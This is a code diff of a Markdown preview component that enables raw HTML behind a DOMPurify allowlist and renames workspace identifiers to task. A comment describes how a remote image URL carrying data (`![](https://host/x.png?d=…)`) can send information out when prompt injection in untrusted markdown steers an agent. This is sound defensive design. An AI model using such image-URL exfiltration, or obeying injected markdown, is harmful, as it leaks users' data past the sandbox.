@@ -1,9 +1,17 @@
-// Rendered Markdown view for .md/.markdown/.mdx files. Parses with
-// markdown-it (raw HTML disabled — the WKWebView has Tauri IPC reach, so a
-// malicious README must never inject script) and renders ```mermaid fenced
-// blocks as SVG diagrams via mermaid (securityLevel: "strict").
+// Rendered Markdown view for .md/.markdown/.mdx files. Parses with markdown-it
+// and renders ```mermaid fenced blocks as SVG diagrams via mermaid
+// (securityLevel: "strict").
 //
-// Images and links: when a workspace `ctx` is provided, relative image srcs
+// Raw HTML is PARSED but then filtered through a DOMPurify allowlist (see
+// ALLOWED_TAGS / ALLOWED_ATTR below) before it reaches the DOM. It used to be
+// dropped wholesale, which was safe but meant the single most common README
+// header on GitHub, `<div align="center">` around an `<img>`, rendered as
+// literal angle-bracket text: termic could not display its own README. The
+// WKWebView has Tauri IPC reach, so a malicious README must never inject
+// script; deny-by-default plus the CSP (script-src 'self', no 'unsafe-inline')
+// is what keeps that true, not the absence of an HTML parser.
+//
+// Images and links: when a task `ctx` is provided, relative image srcs
 // are read over IPC (worktree-contained, image extensions only) and swapped
 // in as data: URLs, and relative link clicks open the target file in a tab
 // (after an existence/type check — dead links and directories no longer open
@@ -12,7 +20,7 @@
 // Remote https images load directly (tauri.conf.json's img-src allows https:).
 // This is an ACCEPTED SANDBOX GAP, not a neutral one: the webview lives outside
 // the seatbelt + CONNECT proxy, so rendering `![](https://host/x.png?d=…)`
-// fires a GET to an arbitrary host with no click, even when the workspace is in
+// fires a GET to an arbitrary host with no click, even when the task is in
 // Enforce and the agent itself is barred from that host. The realistic trigger
 // is prompt injection plus untrusted markdown (a dependency's README, a
 // contributor's fork, a GitHub issue the agent read), not a scheming agent.
@@ -30,13 +38,14 @@
 // So this component owns one <div ref> and drives all of its contents by hand.
 //
 // markdown-it + mermaid are both heavy; this whole component is lazy-loaded
-// (see WorkspaceView) and mermaid is further dynamic-imported on first render
+// (see TaskView) and mermaid is further dynamic-imported on first render
 // so the chunk only lands when a markdown file is actually previewed.
 
 import { useEffect, useRef, useState } from "react";
 import MarkdownIt from "markdown-it";
-import { openPath, workspaceFileReadBase64, workspacePathStat, workspaceRevealPath } from "@/lib/ipc";
-import { dirnamePosix, headingSlug, MARKDOWN_EXT_RE, resolveWorkspaceHref } from "@/lib/markdownPaths";
+import DOMPurify from "dompurify";
+import { openPath, taskFileReadBase64, taskPathStat, taskRevealPath } from "@/lib/ipc";
+import { dirnamePosix, headingSlug, MARKDOWN_EXT_RE, resolveTaskHref } from "@/lib/markdownPaths";
 import { useApp } from "@/store/app";
 import { useUI } from "@/store/ui";
 
@@ -44,9 +53,58 @@ import { useUI } from "@/store/ui";
 // avoided elsewhere in this codebase; a plain counter is deterministic enough.
 let mermaidSeq = 0;
 
-// One markdown-it instance, reused across renders. html:false escapes raw
-// HTML; linkify autolinks bare URLs; we intercept ```mermaid fences below.
-const md = new MarkdownIt({ html: false, linkify: true, typographer: false, breaks: false });
+/** Everything the preview is allowed to render, whether markdown-it emitted it
+ *  or a README hand-wrote it. Deny-by-default: anything absent is dropped, so
+ *  `script`, `iframe`, `object`, `form`, `style` and friends never appear by
+ *  virtue of not being listed. Most of this list is just markdown-it's own
+ *  output (`p`, `li`, `pre`, `table`, …) — cutting it down would break ordinary
+ *  markdown, not just raw HTML. The genuinely new entries are the ones GitHub
+ *  READMEs lean on: div, img, br, details, summary, sub, sup, kbd, span. */
+const ALLOWED_TAGS = [
+  "p", "br", "hr", "div", "span", "blockquote",
+  "h1", "h2", "h3", "h4", "h5", "h6",
+  "em", "strong", "s", "del", "ins", "mark", "sub", "sup", "kbd",
+  "ul", "ol", "li", "dl", "dt", "dd",
+  "pre", "code", "a", "img",
+  "table", "thead", "tbody", "tfoot", "tr", "th", "td",
+  "details", "summary",
+];
+
+/** No `style` (CSS injection), no `on*` (DOMPurify strips those anyway, and the
+ *  CSP has no 'unsafe-inline' so they could not fire regardless), no `srcset`.
+ *  `class` is allowed because markdown-it stamps `language-*` on code blocks; a
+ *  README setting its own class is inert without `style`. `data-mermaid` is
+ *  listed explicitly rather than via ALLOW_DATA_ATTR so the data-* surface stays
+ *  exactly one attribute wide. It grants nothing new: a ```mermaid fence already
+ *  renders author-controlled diagram source (securityLevel: "strict"). */
+const ALLOWED_ATTR = [
+  "href", "src", "alt", "title", "align",
+  "width", "height", "class", "colspan", "rowspan", "start",
+  "data-mermaid",
+];
+
+/** markdown-it renders, DOMPurify decides what survives. Runs on the ASSEMBLED
+ *  html, not per-token: markdown-it emits `<div align="center">` and its
+ *  `</div>` as two separate html_block tokens, so sanitizing them in isolation
+ *  would auto-close the opener and drop the closer, destroying the wrapper. This
+ *  is how GitHub does it too.
+ *
+ *  DOMPurify's URI check still blocks `javascript:` in href/src, and the CSP
+ *  (script-src 'self', no 'unsafe-inline') independently prevents inline script
+ *  and event handlers from ever executing. Three gates, not one. */
+function renderSanitized(text: string): string {
+  return DOMPurify.sanitize(md.render(text), {
+    ALLOWED_TAGS,
+    ALLOWED_ATTR,
+    ALLOW_DATA_ATTR: false,
+  });
+}
+
+// One markdown-it instance, reused across renders. html:true lets the GitHub
+// README idiom (`<div align="center">` wrapping an `<img>`) render at all; every
+// tag then has to survive the allowlist above. linkify autolinks bare URLs; we
+// intercept ```mermaid fences below.
+const md = new MarkdownIt({ html: true, linkify: true, typographer: false, breaks: false });
 const defaultFence = md.renderer.rules.fence!;
 md.renderer.rules.fence = (tokens, idx, options, env, self) => {
   const info = tokens[idx].info.trim().split(/\s+/)[0]?.toLowerCase();
@@ -65,14 +123,14 @@ async function getMermaid() {
   return mermaidMod;
 }
 
-/** Workspace context for resolving relative images/links. Absent (e.g. the
+/** Task context for resolving relative images/links. Absent (e.g. the
  *  Changelog dialog) → relative targets stay inert. `filePath` is the
- *  workspace-relative path of the file being previewed; `epoch` bumps
+ *  task-relative path of the file being previewed; `epoch` bumps
  *  revalidate cached images (wired to fsRevision by MarkdownPane).
- *  `memberDirs` are a multi-repo workspace's member `dir_name`s — threaded
- *  through to `resolveWorkspaceHref` so root-relative links/images and `..`
+ *  `memberDirs` are a multi-repo task's member `dir_name`s — threaded
+ *  through to `resolveTaskHref` so root-relative links/images and `..`
  *  walks stay scoped to the containing member's own root. */
-export type MarkdownCtx = { wsId: string; filePath: string; epoch?: number; memberDirs?: string[] };
+export type MarkdownCtx = { taskId: string; filePath: string; epoch?: number; memberDirs?: string[] };
 
 // Relative-link targets that a text editor tab cannot render. Clicking one
 // reveals it in the OS file manager instead of opening a dead error tab.
@@ -99,7 +157,7 @@ const NEGATIVE_RETRY_COOLDOWN_MS = 1500;
 // lastFilePathRef check in the main render effect below — matching the way
 // an editor tab re-reads from disk on open.
 //
-// - `map` keys by `${wsId}:${path}`. Freshness is tracked by `fp` (the
+// - `map` keys by `${taskId}:${path}`. Freshness is tracked by `fp` (the
 //   backend's mtime:len fingerprint of the bytes actually read), not by
 //   fsRevision epoch — the backend confirms "unchanged since your fp" on
 //   every revalidation, which is what lets a settle re-check every mounted
@@ -167,13 +225,13 @@ function applyImageCacheEntry(img: HTMLImageElement, entry: ImgCacheEntry | unde
  *  `host` that currently references it (there may be more than one, and the
  *  DOM may have been rebuilt since the fetch was issued) — used once a fetch
  *  settles, instead of closing over the specific <img> elements present when
- *  it started. Matches on the `data-md-resolved` marker `hydrateWorkspaceImages`
+ *  it started. Matches on the `data-md-resolved` marker `hydrateTaskImages`
  *  stamps on each <img> (a plain string compare) rather than re-running
- *  `resolveWorkspaceHref` per element per completed fetch — with N images
+ *  `resolveTaskHref` per element per completed fetch — with N images
  *  that's an O(N) rescan on every one of N completions (O(N²) overall)
  *  instead of an O(1) lookup. */
 function applyCacheToMatchingImages(host: HTMLElement, ctx: MarkdownCtx, cache: ImgCache, resolvedPath: string) {
-  const key = `${ctx.wsId}:${resolvedPath}`;
+  const key = `${ctx.taskId}:${resolvedPath}`;
   const entry = cache.map.get(key);
   for (const img of Array.from(host.querySelectorAll<HTMLImageElement>(`img[data-md-resolved]`))) {
     if (img.dataset.mdResolved !== resolvedPath) continue;
@@ -181,16 +239,16 @@ function applyCacheToMatchingImages(host: HTMLElement, ctx: MarkdownCtx, cache: 
   }
 }
 
-/** Fetch (or cheaply revalidate) one workspace image, single-flight per key
+/** Fetch (or cheaply revalidate) one task image, single-flight per key
  *  across overlapping hydrate() calls — a settle's epoch-triggered
  *  revalidation and a concurrent text-triggered re-render never issue two
  *  reads for the same file. Sending the cached `fp` lets the backend answer
  *  "unchanged" without paying for a full read + base64 encode, the fast path
  *  the settle-triggered revalidation of every mounted preview relies on. */
-function fetchWorkspaceImage(cache: ImgCache, ctx: MarkdownCtx, path: string, knownFp: string | undefined, host: HTMLElement) {
-  const key = `${ctx.wsId}:${path}`;
+function fetchTaskImage(cache: ImgCache, ctx: MarkdownCtx, path: string, knownFp: string | undefined, host: HTMLElement) {
+  const key = `${ctx.taskId}:${path}`;
   if (cache.inflight.has(key)) return; // already in flight; its resolution below covers this call too
-  const p = workspaceFileReadBase64(ctx.wsId, path, knownFp)
+  const p = taskFileReadBase64(ctx.taskId, path, knownFp)
     .then(
       (res) => {
         if (res.unchanged) return; // cached entry (and its fp) is still correct
@@ -205,10 +263,10 @@ function fetchWorkspaceImage(cache: ImgCache, ctx: MarkdownCtx, path: string, kn
   cache.inflight.set(key, p);
 }
 
-/** Swap workspace-relative <img> srcs for data: URLs read over IPC. The
+/** Swap task-relative <img> srcs for data: URLs read over IPC. The
  *  webview would resolve a relative src against its own origin (a guaranteed
  *  404), so every relative src is moved into data-md-src up front and only
- *  restored once a workspace read succeeds. Stale-while-revalidate: cached
+ *  restored once a task read succeeds. Stale-while-revalidate: cached
  *  state (positive or negative) is applied synchronously on every call, for
  *  every currently-present <img> — a rebuilt DOM node (the main render
  *  effect regenerates innerHTML on text/theme changes) picks up a prior
@@ -220,7 +278,7 @@ function fetchWorkspaceImage(cache: ImgCache, ctx: MarkdownCtx, path: string, kn
  *  the epoch effect passes that on a settle, the main text-driven effect
  *  doesn't (typing doesn't change files on disk, no need to re-check a
  *  known-good image on every keystroke). Exported for tests only. */
-export function hydrateWorkspaceImages(
+export function hydrateTaskImages(
   host: HTMLElement,
   ctx: MarkdownCtx | undefined,
   cache: ImgCache,
@@ -237,18 +295,18 @@ export function hydrateWorkspaceImages(
       img.dataset.mdSrc = raw = src;
       img.removeAttribute("src");
     }
-    if (!ctx) continue; // no workspace (Changelog dialog): stays src-less
-    const resolved = resolveWorkspaceHref(baseDir, raw, memberDirs);
+    if (!ctx) continue; // no task (Changelog dialog): stays src-less
+    const resolved = resolveTaskHref(baseDir, raw, memberDirs);
     if (!resolved) continue; // root-escaping / scheme URL: stays src-less
     img.dataset.mdResolved = resolved; // O(1) lookup key for applyCacheToMatchingImages
-    const key = `${ctx.wsId}:${resolved}`;
+    const key = `${ctx.taskId}:${resolved}`;
     const cached = cache.map.get(key);
     applyImageCacheEntry(img, cached);
     const isPositive = !!cached?.dataUrl;
     const negativeOnCooldown = cached && !isPositive
       && Date.now() - (cached.failedAt ?? 0) < NEGATIVE_RETRY_COOLDOWN_MS;
     if ((!cached || !isPositive || revalidatePositive) && !negativeOnCooldown) {
-      fetchWorkspaceImage(cache, ctx, resolved, isPositive ? cached!.fp : undefined, host);
+      fetchTaskImage(cache, ctx, resolved, isPositive ? cached!.fp : undefined, host);
     }
   }
 }
@@ -451,8 +509,8 @@ export function MarkdownPreview(
     // don't autolink; explicit [text](url) links still render. The md instance
     // is shared, but set+render are atomic per effect run so there's no bleed.
     md.set({ linkify });
-    host.innerHTML = md.render(text || "");
-    hydrateWorkspaceImages(host, ctx, imgCacheRef.current!, { revalidatePositive: isNavigation });
+    host.innerHTML = renderSanitized(text || "");
+    hydrateTaskImages(host, ctx, imgCacheRef.current!, { revalidatePositive: isNavigation });
     const blocks = Array.from(host.querySelectorAll<HTMLElement>(".mermaid-block"));
     if (blocks.length === 0) return () => { alive = false; };
 
@@ -489,7 +547,7 @@ export function MarkdownPreview(
     })();
     return () => { alive = false; };
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [text, themeDark, linkify, ctx?.wsId, ctx?.filePath, ctx?.memberDirs]);
+  }, [text, themeDark, linkify, ctx?.taskId, ctx?.filePath, ctx?.memberDirs]);
 
   // fsRevision bump = images may have changed on disk. Revalidate ONLY the
   // images (cached bytes stay on screen until a fresh read lands; a cheap
@@ -506,7 +564,7 @@ export function MarkdownPreview(
   useEffect(() => {
     const host = hostRef.current;
     if (epochEffectRanOnceRef.current && host && ctx && visible) {
-      hydrateWorkspaceImages(host, ctx, imgCacheRef.current!, { revalidatePositive: true });
+      hydrateTaskImages(host, ctx, imgCacheRef.current!, { revalidatePositive: true });
     }
     epochEffectRanOnceRef.current = true;
     // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -518,7 +576,7 @@ export function MarkdownPreview(
 
   // Drop any pending reveal when the underlying file identity changes. This
   // component instance is NOT remounted when a preview tab recycles to a
-  // different path (WorkspaceView keys by tab id, not path; MarkdownPane
+  // different path (TaskView keys by tab id, not path; MarkdownPane
   // reuses the same MarkdownPreview across the swap) — so without this, a
   // reveal captured for the PREVIOUS file that's still mid-retry (waiting
   // out the empty-text grace window while that file loads) would survive
@@ -531,7 +589,7 @@ export function MarkdownPreview(
   useEffect(() => {
     revealStateRef.current = newRevealState();
     // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [ctx?.wsId, ctx?.filePath]);
+  }, [ctx?.taskId, ctx?.filePath]);
 
   // Capture a newly-arrived revealHeading fragment and consume it from the
   // tab IMMEDIATELY, before we know whether the container is even visible
@@ -623,10 +681,10 @@ export function MarkdownPreview(
   // Intercept link clicks: a bare <a href> would navigate the whole webview
   // (and blow away the app), so preventDefault runs before any early return.
   // External links go to the OS opener, #fragments scroll the preview, and
-  // workspace-relative links are stat'd first — a missing target shows a
+  // task-relative links are stat'd first — a missing target shows a
   // toast instead of opening a dead tab, a directory reveals in the file
   // manager instead of trying to open as text — before opening the target
-  // file in a tab (markdown targets land in MarkdownPane via WorkspaceView
+  // file in a tab (markdown targets land in MarkdownPane via TaskView
   // routing); a `file.md#heading` fragment rides along as the new tab's
   // revealHeading, but only for a markdown target — a non-markdown tab has
   // no MarkdownPane to ever consume it. Targets an editor can't render
@@ -639,8 +697,8 @@ export function MarkdownPreview(
     if (!href) return;
     if (/^https?:\/\//i.test(href) || /^mailto:/i.test(href)) { openPath(href); return; }
     if (href.startsWith("#")) { scrollToHeading(hostRef.current, href.slice(1)); return; }
-    if (!ctx) return; // no workspace context (Changelog dialog): inert
-    const resolved = resolveWorkspaceHref(dirnamePosix(ctx.filePath), href, ctx.memberDirs ?? []);
+    if (!ctx) return; // no task context (Changelog dialog): inert
+    const resolved = resolveTaskHref(dirnamePosix(ctx.filePath), href, ctx.memberDirs ?? []);
     if (!resolved) return; // root-escaping / other scheme: inert
     const hashIdx = href.indexOf("#");
     const fragment = hashIdx >= 0 ? href.slice(hashIdx + 1) : "";
@@ -652,7 +710,7 @@ export function MarkdownPreview(
     }
     let stat: { exists: boolean; is_dir: boolean };
     try {
-      stat = await workspacePathStat(ctx.wsId, resolved);
+      stat = await taskPathStat(ctx.taskId, resolved);
     } catch (err) {
       useUI.getState().pushToast(`Couldn't open ${resolved}: ${err}`, "error");
       return;
@@ -662,11 +720,11 @@ export function MarkdownPreview(
       return;
     }
     if (stat.is_dir || BINARY_LINK_RE.test(resolved)) {
-      workspaceRevealPath(ctx.wsId, resolved)
+      taskRevealPath(ctx.taskId, resolved)
         .catch(err => useUI.getState().pushToast(`Couldn't reveal ${resolved}: ${err}`, "error"));
       return;
     }
-    useApp.getState().openPreviewTab(ctx.wsId, {
+    useApp.getState().openPreviewTab(ctx.taskId, {
       type: "edit",
       path: resolved,
       title: resolved.split("/").pop() || resolved,
